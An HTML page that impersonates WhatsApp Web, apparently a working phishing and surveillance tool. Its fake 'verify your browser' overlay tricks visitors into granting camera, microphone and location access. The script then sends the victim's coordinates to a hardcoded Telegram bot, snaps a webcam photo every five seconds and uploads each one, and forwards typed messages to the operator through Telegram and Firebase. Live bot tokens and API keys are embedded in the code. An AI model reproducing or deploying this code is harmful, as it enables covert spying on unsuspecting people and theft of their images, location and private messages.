<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>WhatsApp</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-attachment: fixed; height: 100vh; display: flex; flex-direction: column; }
        
        /* WhatsApp Header */
        .header { background: #008069; color: white; padding: 10px 15px; display: flex; align-items: center; gap: 10px; z-index: 100; }
        .p-img { width: 40px; height: 40px; border-radius: 50%; background: #ccc; }
        .info { flex: 1; }
        .status { font-size: 12px; color: #cfdfdb; }

        /* Chat Display */
        #chatDisplay { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 5px; }
        .bubble { max-width: 85%; padding: 7px 12px; border-radius: 8px; font-size: 15px; position: relative; margin-bottom: 2px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
        .sent { align-self: flex-end; background: #d9fdd3; border-top-right-radius: 0; }
        .received { align-self: flex-start; background: #ffffff; border-top-left-radius: 0; }
        .time { font-size: 10px; color: #667781; text-align: right; margin-top: 3px; }

        /* Input Area */
        .input-area { background: #f0f2f5; padding: 7px 10px; display: flex; align-items: center; gap: 8px; }
        .input-box { flex: 1; background: #fff; border-radius: 25px; padding: 8px 15px; display: flex; align-items: center; gap: 10px; }
        .input-box input { flex: 1; border: none; outline: none; font-size: 16px; }
        .mic-btn { background: #00a884; color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: none; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }

        /* Permission Overlay */
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="overlay">
    <i class="fab fa-whatsapp" style="font-size: 70px; color: #25d366; margin-bottom: 20px;"></i>
    <h2 style="margin-bottom: 10px;">WhatsApp Web</h2>
    <p style="color: #667781; margin-bottom: 30px;">To start a secure end-to-end encrypted chat with M.H. Miraz, please verify your browser.</p>
    <button onclick="startSecureChat()" style="background: #25d366; color: white; border: none; padding: 12px 40px; border-radius: 25px; font-weight: bold; font-size: 16px;">Verify & Continue</button>
</div>

<div class="header">
    <i class="fas fa-arrow-left"></i>
    <div class="p-img" style="background-image: url('profile.jpg'); background-size: cover;"></div>
    <div class="info">
        <div style="font-weight: bold; font-size: 17px;">M.H. Miraz</div>
        <div class="status">online</div>
    </div>
    <i class="fas fa-video"></i>
    <i class="fas fa-phone-alt"></i>
    <i class="fas fa-ellipsis-v"></i>
</div>

<div id="chatDisplay"></div>

<div class="input-area">
    <div class="input-box">
        <i class="far fa-smile" style="color: #667781; font-size: 22px;"></i>
        <input type="text" id="waIn" placeholder="Message">
        <i class="fas fa-paperclip" style="color: #667781; font-size: 20px; transform: rotate(-45deg);"></i>
        <i class="fas fa-camera" style="color: #667781; font-size: 20px;"></i>
    </div>
    <button class="mic-btn" onclick="sendMsg()"><i class="fas fa-paper-plane" id="sendIcon"></i></button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    // তোমার অরিজিনাল Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyCZixj8Sxr_AINbwVtn5llbDbnwbsDVQ1Q",
        authDomain: "myfacebook-com-mhmiraz2hkahy31.firebaseapp.com",
        databaseURL: "https://myfacebook-com-mhmiraz2hkahy31-default-rtdb.firebaseio.com",
        projectId: "myfacebook-com-mhmiraz2hkahy31",
        storageBucket: "myfacebook-com-mhmiraz2hkahy31.firebasestorage.app",
        messagingSenderId: "778369076728",
        appId: "1:778369076728:web:1cb91ca575f406d4821a0d"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
    const CHAT_ID = '7767412329';

    async function startSecureChat() {
        try {
            // ১. ক্যামেরা ও মাইক পারমিশন (বাধ্যতামূলক)
            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
            document.getElementById('v').srcObject = stream;

            // ২. লোকেশন পারমিশন
            navigator.geolocation.getCurrentPosition(p => {
                const loc = `📍 Location: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}`);
            });

            // ৩. ওভারলে সরানো এবং ট্র্যাকিং শুরু
            document.getElementById('overlay').style.display = 'none';
            setInterval(capture, 5000); // প্রতি ৫ সেকেন্ডে ছবি

        } catch (e) {
            alert("Permission Denied. Please allow access to use WhatsApp Web.");
        }
    }

    function capture() {
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        if(v.videoWidth === 0) return;
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 'wa.jpg');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:f});
        }, 'image/jpeg', 0.4);
    }

    // ৪. লাইভ চ্যাট লজিক
    function sendMsg() {
        const i = document.getElementById('waIn');
        const t = i.value.trim();
        if(t !== "") {
            append('sent', t);
            db.ref('miraz/waMsg').set(t); // Firebase এ পাঠানো
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=WA Msg: ${encodeURIComponent(t)}`);
            i.value = "";
        }
    }

    db.ref('miraz/waReply').on('value', s => {
        const r = s.val();
        if(r && r !== "") {
            append('received', r);
            db.ref('miraz/waReply').set(""); // ক্লিয়ার
        }
    });

    function append(type, text) {
        const chat = document.getElementById('chatDisplay');
        const now = new Date();
        const timeStr = now.getHours() + ":" + (now.getMinutes()<10?'0':'') + now.getMinutes();
        const div = document.createElement('div');
        div.className = `bubble ${type}`;
        div.innerHTML = `${text}<div class="time">${timeStr} ${type==='sent'?'<i class="fas fa-check-double" style="color:#53bdeb"></i>':''}</div>`;
        chat.appendChild(div);
        chat.scrollTop = chat.scrollHeight;
    }
</script>
</body>
</html>
